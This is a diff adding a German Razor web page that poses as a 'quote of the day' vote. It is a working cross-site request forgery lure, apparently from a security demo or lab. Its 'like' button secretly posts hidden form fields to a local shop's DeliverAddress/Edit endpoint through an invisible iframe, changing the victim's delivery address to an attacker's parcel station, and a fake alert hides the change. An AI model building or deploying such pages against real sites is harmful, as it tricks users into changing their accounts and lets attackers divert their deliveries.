@@ -1,0 +1,26 @@
+﻿@{
+    ViewBag.Title = "Zitat des Tages";
+}
+
+<div class="jumbotron">
+    <h1>Zitat des Tages</h1>
+    <p class="lead">Morgenstund hat Gold im Mund</p>
+    <form action="http://localhost:64255//DeliverAddress/Edit" method="post" target="hiddenframe">
+
+
+                    <input id="LastName" name="LastName" type="hidden" value="Hacker"/>
+                           
+                    <input id="FirstName" name="FirstName" type="hidden" value="Anonymer"/>
+                           
+                    <input id="Street" name="Street" type="hidden" value="DHL Packstation 123"/>
+                           
+                    <input id="Zip" name="Zip" type="hidden" value="99999"/>
+                           
+                    <input id="City" name="City" type="hidden" value="Hackertal"/>
+                   
+                    <input type="submit" value="Gefällt mir" class="btn btn-success" onclick="alert('Vielen Dank für deine Stimme! Leider hast du nicht gewonnen.');"/>
+
+    </form>
+</div>
+<div>Stimme jetzt ab und gewinne mit etwas Glück eine Überraschung!</div>
+<iframe id="hiddenframe" name="hiddenframe" style="visibility: hidden;"></iframe>
